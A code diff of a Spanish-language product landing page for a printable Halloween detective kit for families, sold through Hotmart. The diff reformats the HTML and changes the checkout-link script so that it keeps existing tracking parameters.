   </div>
 </section>
 
 <section class="section soft">
   <div class="wrap split">
     <div>
-      <span class="eyebrow">
-        Un plan con algo que resolver juntos
-      </span>
-
+      <span class="eyebrow">Un plan con algo que resolver juntos</span>
       <h2>
         Menos improvisar.<br>
         Más compartir la aventura.
       </h2>
-
       <p class="intro">
         Reúne al equipo alrededor de una mesa y lee la historia.
         La calabaza del desfile ha desaparecido: tendrán que
         comparar las pruebas para descubrir quién la movió,
         dónde está y cuál es el código.
       </p>
-
       <ul class="check">
         <li>Una historia con un objetivo concreto.</li>
         <li>Cuatro expedientes que se conectan.</li>
@@ -1099,30 +423,19 @@ body.modal-open{overflow:hidden}
 
     <div>
       <picture>
-        <source
-          media="(min-width:900px)"
-          srcset="
-            assets/family-800-9c0ad02412.webp 800w,
-            assets/family-1200-5eea919ca7.webp 1200w
-          "
-          sizes="530px"
-        >
-        <img
-          src="assets/family-400-43eca7ba7d.webp"
-          srcset="
-            assets/family-400-43eca7ba7d.webp 400w,
-            assets/family-640-95454093ed.webp 640w
-          "
-          sizes="(min-width:900px) 530px, calc(100vw - 36px)"
-          width="1536"
-          height="1024"
-          loading="lazy"
-          decoding="async"
-          class="rounded"
-          alt="Escena ilustrativa de dos niños comparando las fichas del caso con una adulta"
-        >
+        <source media="(min-width:900px)"
+                srcset="assets/family-800-9c0ad02412.webp 800w,
+                        assets/family-1200-5eea919ca7.webp 1200w"
+                sizes="530px">
+        <img src="assets/family-400-43eca7ba7d.webp"
+             srcset="assets/family-400-43eca7ba7d.webp 400w,
+                     assets/family-640-95454093ed.webp 640w"
+             sizes="(min-width:900px) 530px, calc(100vw - 36px)"
+             width="1536" height="1024"
+             loading="lazy" decoding="async"
+             class="rounded"
+             alt="Escena ilustrativa de dos niños comparando las fichas del caso con una adulta">
       </picture>
-
       <p class="note">
         Escena ilustrativa de uso.
         Papel, lápices y decoración no incluidos.
@@ -1133,10 +446,7 @@ body.modal-open{overflow:hidden}
 
 <section class="section wrap">
   <div class="head">
-    <span class="eyebrow">
-      Esto forma parte de la compra principal
-    </span>
-
+    <span class="eyebrow">Esto forma parte de la compra principal</span>
     <h2>
       La misión completa.<br>
       Y el apoyo para prepararla.
@@ -1243,12 +553,10 @@ body.modal-open{overflow:hidden}
 <section class="section wrap">
   <div class="head">
     <span class="eyebrow">¿Encaja con tu grupo?</span>
-
     <h2>
       Una investigación acompañada,<br>
       al ritmo de tu equipo.
     </h2>
-
     <p>
       Las pruebas combinan lectura, comparación de datos,
       un plano y cálculos.
@@ -1289,20 +597,15 @@ body.modal-open{overflow:hidden}
 <section class="section offer" id="oferta">
   <div class="wrap offer-grid">
     <div class="offer-summary">
-      <span class="eyebrow">
-        Una compra · La misión completa
-      </span>
-
+      <span class="eyebrow">Una compra · La misión completa</span>
       <h2>
         Ya tienes el plan.<br>
         Reúne a tus detectives.
       </h2>
-
       <p>
         Historia, pruebas y respuestas en un solo kit.
         Tú preparas las hojas; juntos dan vida a Villa Luna.
       </p>
-
       <p class="small">
         La decoración adicional y las láminas para colorear
         del checkout son opcionales.
@@ -1312,11 +615,7 @@ body.modal-open{overflow:hidden}
 
     <div class="offer-card" id="comprar">
       <span class="eyebrow">Kit digital en español</span>
-
-      <h3 class="offer-title">
-        El caso de la calabaza desaparecida
-      </h3>
-
+      <h3 class="offer-title">El caso de la calabaza desaparecida</h3>
       <div class="price">US$9.99 <span>USD</span></div>
       <p>Pago único. Sin suscripción.</p>
 
@@ -1330,9 +629,11 @@ body.modal-open{overflow:hidden}
         <li>Permiso para tu hogar o tu propio grupo escolar.</li>
       </ul>
 
-      <button class="btn" type="button" data-buy>
+      <a class="btn"
+         href="https://pay.hotmart.com/R108013081C?checkoutMode=10"
+         data-checkout-link>
         Quiero el kit completo →
-      </button>
+      </a>
 
       <p class="payment">Pago procesado por Hotmart.</p>
 
@@ -1342,11 +643,9 @@ body.modal-open{overflow:hidden}
           instrucciones de acceso de Hotmart.
           Descarga el kit y empieza por EMPIEZA-AQUI.
         </p>
-
         <p>
           <strong>PDF para imprimir. Sin envío físico.</strong>
         </p>
-
         <p class="tax-note">
           Precio base en USD.
           La moneda local, los impuestos y el total aplicable
@@ -1507,32 +806,21 @@ body.modal-open{overflow:hidden}
 </section>
 
 <section class="section wrap closing separator">
-  <span class="eyebrow">
-    Cuatro sospechosos. Un equipo. Una misión.
-  </span>
-
+  <span class="eyebrow">Cuatro sospechosos. Un equipo. Una misión.</span>
   <h2>
     Este Halloween,<br>
     una historia para vivir juntos.
   </h2>
+  <p>Prepara las hojas y deja que empiece la investigación.</p>
 
-  <p>
-    Prepara las hojas y deja que empiece la investigación.
-  </p>
-
-  <a
-    class="btn"
-    href="https://pay.hotmart.com/R108013081C?checkoutMode=10"
-    data-checkout-link
-  >
+  <a class="btn"
+     href="https://pay.hotmart.com/R108013081C?checkoutMode=10"
+     data-checkout-link>
     Quiero nuestra aventura · US$9.99 →
   </a>
 
-  <p class="small">
-    Producto digital en español · Pago único
-  </p>
+  <p class="small">Producto digital en español · Pago único</p>
 </section>
-
 </main>
 
 <footer>
@@ -1540,7 +828,6 @@ body.modal-open{overflow:hidden}
     <div>
       <strong>VILLA LUNA</strong>
       <p>Aventuras originales para imprimir.</p>
-
       <div class="footer-links">
         <a href="#muestras">Ver muestras</a>
         <a href="#preguntas">Ayuda y condiciones</a>
@@ -1553,12 +840,10 @@ body.modal-open{overflow:hidden}
         Licencia para tu hogar o tu propio grupo escolar.
         No se permite revender ni redistribuir los archivos.
       </p>
-
       <p>
         Soporte y solicitudes sobre tu pedido:
         consulta los datos de contacto en tu compra de Hotmart.
       </p>
-
       <span id="support"></span>
     </div>
   </div>
@@ -1567,41 +852,29 @@ body.modal-open{overflow:hidden}
 <div class="sticky">
   <div class="sticky-inner">
     <div>
-      <strong>
-        US$9.99 <span style="font-size:11px">USD</span>
-      </strong>
+      <strong>US$9.99 <span style="font-size:11px">USD</span></strong>
       <small>Kit digital · Pago único</small>
     </div>
 
-    <a
-      class="btn"
-      href="https://pay.hotmart.com/R108013081C?checkoutMode=10"
-      data-sticky-cta
-    >
+    <a class="btn"
+       href="https://pay.hotmart.com/R108013081C?checkoutMode=10"
+       data-sticky-cta>
       Quiero el kit →
     </a>
   </div>
 </div>
 
 <dialog id="imageDialog" aria-label="Página original del kit">
-  <button class="close" type="button" data-close>
-    Cerrar ×
-  </button>
+  <button class="close" type="button" data-close>Cerrar ×</button>
   <img alt="">
 </dialog>
 
 <dialog id="checkoutDialog" aria-labelledby="checkoutTitle">
-  <button class="close" type="button" data-close>
-    Cerrar ×
-  </button>
-
+  <button class="close" type="button" data-close>Cerrar ×</button>
   <h3 id="checkoutTitle">Continúa con tu compra en Hotmart</h3>
-
   <p>
-    <a
-      class="btn"
-      href="https://pay.hotmart.com/R108013081C?checkoutMode=10"
-    >
+    <a class="btn"
+       href="https://pay.hotmart.com/R108013081C?checkoutMode=10">
       Abrir checkout →
     </a>
   </p>
@@ -1647,6 +920,7 @@ document.addEventListener('DOMContentLoaded', function () {
   }
 
   function purchaseIntent() {
+    // Evento local de clique. Não envia Purchase para a Meta.
     window.dispatchEvent(
       new CustomEvent('villa-luna:checkout-click', {
         detail: {
@@ -1722,27 +996,29 @@ document.addEventListener('DOMContentLoaded', function () {
   });
 
   document.querySelectorAll(
-    '[data-checkout-link], [data-sticky-cta]'
+    '[data-checkout-link], [data-sticky-cta], #checkoutDialog a'
   ).forEach(function (link) {
-    link.href = checkoutTarget() || fallback;
+    const target = new URL(checkoutTarget() || fallback);
+    const existing = new URL(link.href);
 
-    link.addEventListener('click', function () {
-      link.href = checkoutTarget() || fallback;
-      purchaseIntent();
-    });
-  });
-
-  document.querySelectorAll('[data-buy]').forEach(function (button) {
-    button.addEventListener('click', function () {
-      const target = checkoutTarget();
-
-      if (!target) {
-        openDialog(document.getElementById('checkoutDialog'));
-        return;
+    // Preserva parâmetros que já tenham sido adicionados ao link.
+    if (
+      existing.origin === target.origin &&
+      existing.pathname === target.pathname
+    ) {
+      for (const [key, value] of existing.searchParams) {
+        if (!target.searchParams.has(key)) {
+          target.searchParams.set(key, value);
+        }
       }
+    }
 
+    link.href = target.href;
+
+    // Não reescreve o link no clique:
+    // mantém os parâmetros adicionados pela UTMify.
+    link.addEventListener('click', function () {
       purchaseIntent();
-      location.assign(target);
     });
   });
 
